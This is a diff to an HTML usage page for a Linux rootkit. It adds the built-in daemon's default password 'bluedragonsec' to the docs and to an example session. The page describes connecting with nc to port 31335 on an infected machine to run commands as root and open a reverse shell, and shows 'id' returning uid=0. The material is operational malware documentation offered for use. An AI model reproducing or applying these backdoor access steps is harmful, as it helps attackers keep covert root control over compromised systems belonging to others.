@@ -58,7 +58,7 @@ root@robotsoft:~#
 <br>
 <h4>Using the Rootkit Daemon</h4>
 <br>
-Rootkit built in daemon is listening on port 31335.
+Rootkit built in daemon is listening on port 31335, default password is : bluedragonsec.
 Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely.
   To connect  to rootkit daemon, open your terminal and type :
   <pre>
@@ -75,6 +75,7 @@ CMD :
 Type any linux command in cmd prompt
 <pre>
 robotsoft@robotsoft:~$ nc 192.168.43.36 31335
+Password :bluedragonsec
 CMD :id
 uid=0(root) gid=0(root) groups=0(root)
 CMD :uname -a
